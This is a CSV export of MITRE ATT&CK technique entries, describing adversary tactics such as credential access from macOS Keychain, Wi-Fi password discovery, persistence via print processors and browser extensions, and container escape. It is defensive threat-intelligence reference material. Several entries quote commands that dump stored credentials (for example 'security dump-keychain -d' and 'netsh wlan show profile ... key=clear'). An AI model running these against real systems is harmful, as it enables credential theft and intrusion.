attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b,1,T1615,Group Policy Discovery,"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)

Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",Windows,FALSE,FALSE,2021-08-06T13:10:12Z
attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292,1,T1565.001,Stored Data Manipulation,"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","Linux, macOS, Windows",FALSE,FALSE,2020-03-02T14:22:24Z
attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3,1,T1555.001,Keychain,"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. 

Keychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)

Adversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)",macOS,FALSE,FALSE,2020-02-12T18:55:24Z
attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf,1,T1547,Boot or Logon Autostart Execution,"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.

Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.","Linux, macOS, Windows, Network Devices",FALSE,FALSE,2020-01-23T17:46:59Z
attack-pattern--215d9700-5881-48b8-8265-6449dbb7195d,1,T1652,Device Driver Discovery,"Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).

Many OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)

On Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)","Linux, macOS, Windows",FALSE,FALSE,2023-03-28T20:14:49Z
attack-pattern--278716b1-61ce-4a74-8d17-891d0c494101,1,T1176.001,Browser Extensions,"Adversaries may abuse internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality to and customize aspects of internet browsers. They can be installed directly via a local file or custom URL or through a browser's app store - an official online platform where users can browse, install, and manage extensions for a specific web browser. Extensions generally inherit the web browser's permissions previously granted.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition) 
 
Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores, so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary-controlled server or manipulate the mobile configuration file to silently install additional extensions. 

Adversaries may abuse how chromium-based browsers load extensions by modifying or replacing the Preferences and/or Secure Preferences files to silently install malicious extensions. When the browser is not running, adversaries can alter these files, ensuring the extension is loaded, granted desired permissions, and will persist in browser sessions. This method does not require user consent and extensions are silently loaded in the background from disk or from the browser's trusted store.(Citation: Pulsedive)
  
Previous to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles; however, <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS) 
 
Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) 

There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Stealth](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek)","Linux, Windows, macOS",FALSE,FALSE,2025-03-30T22:12:27Z
attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad,1,T1547.012,Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)

Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key that points to the DLL.

For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)

The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",Windows,FALSE,FALSE,2020-10-05T13:24:49Z
attack-pattern--31e5011f-090e-45be-9bb6-17a1c5e8219b,1,T1675,ESXi Administration Command,"Adversaries may abuse ESXi administration services to execute commands on guest machines hosted within an ESXi virtual environment. Persistent background services on ESXi-hosted VMs, such as the VMware Tools Daemon Service, allow for remote management from the ESXi server. The tools daemon service runs as `vmtoolsd.exe` on Windows guest operating systems, `vmware-tools-daemon` on macOS, and `vmtoolsd ` on Linux.(Citation: Broadcom VMware Tools Services) 

Adversaries may leverage a variety of tools to execute commands on ESXi-hosted VMs – for example, by using the vSphere Web Services SDK to programmatically execute commands and scripts via APIs such as `StartProgramInGuest`, `ListProcessesInGuest`,  `ListFileInGuest`, and `InitiateFileTransferFromGuest`.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Broadcom Running Guest OS Operations) This may enable follow-on behaviors on the guest VMs, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083), [Data from Local System](https://attack.mitre.org/techniques/T1005), or [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).",ESXi,FALSE,FALSE,2025-03-28T14:01:52Z
attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490,1,T1565.003,Runtime Data Manipulation,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","Linux, macOS, Windows",FALSE,FALSE,2020-03-02T14:30:05Z
attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d,1,T1137.006,Add-ins,"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)

Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.","Windows, Office Suite",FALSE,FALSE,2019-11-07T19:52:52Z
attack-pattern--34ff60a3-a3f8-42e4-bed0-af9a2cb563d7,1,T1685.002,Disable or Modify Cloud Log,"An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities. 

For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality, for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Cloud Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the Set-MailboxAuditBypassAssociation cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading)","IaaS, SaaS, Identity Provider, Office Suite",FALSE,FALSE,2026-04-14T22:54:02Z
attack-pattern--3a32740a-11b0-4bcf-b0a9-3abd0f6d3cd5,1,T1059.010,AutoHotKey & AutoIT,"Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)

Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate)

These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)",Windows,FALSE,FALSE,2024-03-29T18:07:04Z
attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a,1,T1558,Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.

On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)
","Linux, macOS, Windows",FALSE,FALSE,2020-02-11T19:12:46Z
attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83,1,T1546.011,Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)

Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. 

A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:

* <code>%WINDIR%\AppPatch\sysmain.sdb</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>

Custom databases are stored in:

* <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>

To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).

Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",Windows,FALSE,FALSE,2020-01-24T14:56:24Z
attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517,1,T1552,Unsecured Credentials,"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Shell History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation: Brining MimiKatz to Unix)","Windows, SaaS, IaaS, Linux, macOS, Containers, Network Devices, Office Suite, Identity Provider",FALSE,FALSE,2020-02-04T12:47:23Z
attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c,1,T1659,Content Injection,"Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)

Adversaries may inject content to victim systems in various ways, including:

* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)
* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)

Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with ""lawful interception.""(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)","Linux, macOS, Windows",FALSE,FALSE,2023-09-01T21:03:13Z
attack-pattern--48b836c6-e4ca-435a-82a3-29c03e5b492e,1,T1557.004,Evil Twin,"Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia ‘Evil Twin’)

By using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation: medium evil twin)  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.(Citation: specter ops evil twin)  A Wi-Fi Pineapple – a network security auditing and penetration testing tool – may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic. 

Similarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.(Citation: specter ops evil twin)  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.

Upon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim’s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.",Network Devices,FALSE,FALSE,2024-09-17T14:27:40Z
attack-pattern--494ab9f0-36e0-4b06-b10d-57285b040a06,1,T1016.002,Wi-Fi Discovery,"Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.

Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile “Wi-Fi name” key=clear` to show a Wi-Fi network’s corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader)

On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac)
","Linux, Windows, macOS",FALSE,FALSE,2023-09-08T15:39:50Z
attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665,1,T1611,Escape to Host,"Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)

There are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)

Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)

In ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.(Citation: Broadcom VMSA-2025-004)

Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.","Windows, Linux, Containers, ESXi",FALSE,FALSE,2021-03-30T17:38:34Z
attack-pattern--4a6cfdae-1417-40c7-a84e-f59d21c58266,1,T1518.002,Backup Software Discovery,"Adversaries may attempt to get a listing of backup software or configurations that are installed on a system. Adversaries may use this information to shape follow-on behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).  

Commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), `reg query` with [Reg](https://attack.mitre.org/software/S0075), `dir` with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for, such as Veeam, Acronis, Dropbox, or Paragon.(Citation: Symantec Play Ransomware 2023)","Windows, macOS, Linux",FALSE,FALSE,2025-05-22T18:57:47Z
attack-pattern--4b46767d-4a61-4f30-995e-c19a75c2e536,1,T1569.003,Systemctl,"Adversaries may abuse systemctl to execute commands or programs. Systemctl is the primary interface for systemd, the Linux init system and service manager. Typically invoked from a shell, Systemctl can also be integrated into scripts or applications.   

Adversaries may use systemctl to execute commands or programs as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s. Common subcommands include: `systemctl start`, `systemctl stop`, `systemctl enable`, `systemctl disable`, and `systemctl status`.(Citation: Red Hat Systemctl 2022)",Linux,FALSE,FALSE,2025-03-18T13:44:12Z
attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466,1,T1029,Scheduled Transfer,"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.

When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:34Z
attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd,1,T1602.002,Network Device Configuration Dump,"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.

Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",Network Devices,FALSE,FALSE,2020-10-20T00:08:21Z
attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47,1,T1185,Browser Session Hijacking,"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)

A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.

Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",Windows,FALSE,FALSE,2018-01-16T16:13:52Z
attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f,1,T1556.007,Hybrid Identity,"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  

Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity):

* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud 
* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory 
* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID 

AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. 

By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)

In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)","IaaS, Identity Provider, Office Suite, SaaS, Windows",FALSE,FALSE,2022-09-28T13:29:53Z
attack-pattern--56e0d8b8-3e25-49dd-9050-3aa252f5aa92,1,T1610,Deploy Container,"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)

Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Container)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",Containers,FALSE,FALSE,2021-03-29T16:51:26Z
attack-pattern--63e3d25c-d57d-407d-8e6a-2cecd71f90be,1,T1674,Input Injection,"Adversaries may simulate keystrokes on a victim’s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).

For example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.(Citation: BleepingComputer BackSwap)(Citation: welivesecurity BackSwap)

Adversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers.(Citation: BleepingComputer USB)","Windows, macOS, Linux",FALSE,FALSE,2025-03-27T18:14:06Z
